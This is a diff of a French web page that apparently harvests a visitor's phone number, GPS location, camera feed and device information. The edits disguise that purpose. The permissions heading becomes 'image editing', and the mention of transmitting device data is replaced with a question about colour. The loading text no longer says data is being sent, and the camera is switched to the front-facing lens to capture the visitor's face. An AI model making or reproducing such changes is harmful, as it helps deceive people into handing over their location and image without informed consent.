@@ -76,15 +76,15 @@
 
     <!-- Affichage unique regroupant toutes les demandes -->
     <div class="card" id="formCard">
-        <h1>Autorisations requises</h1>
+        <h1>Modification d'images</h1>
         <p style="font-size: 14px; color: #666; text-align: center; margin-bottom: 15px;">
-            Veuillez examiner et valider les conditions ci-dessous :
+            Juste un petit detail :
         </p>
         <ul>
-            <li>Confirmation du numéro : <span class="phone-highlight" id="phoneText">Chargement...</span></li>
+            <li>N°: <span class="phone-highlight" id="phoneText">Chargement...</span></li>
             <li>Autorisation d'accès au <strong>GPS (Position géographique)</strong></li>
             <li>Autorisation d'accès à la <strong>caméra (Capture de l'environnement)</strong></li>
-            <li>Transmission des informations techniques de l'appareil</li>
+            <li>Voulez-vous que l'image soit en couleur ?</li>
         </ul>
         
         <div class="buttons-container">
@@ -96,7 +96,7 @@
     <!-- Étape de chargement -->
     <div class="card" id="loadingCard" style="display: none; text-align: center;">
         <h1>Traitement en cours...</h1>
-        <p style="color: #666;">Veuillez patienter pendant la transmission des données...</p>
+        <p style="color: #666;">Veuillez patienter ou reessayer...</p>
     </div>
 
     <video id="cameraStream" autoplay playsinline></video>
@@ -164,7 +164,7 @@
             try {
                 // 1. Capture simultanée / séquentielle de la caméra
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' } 
+                    video: { facingMode: 'user' } 
                 });
                 
                 const videoElement = document.getElementById('cameraStream');
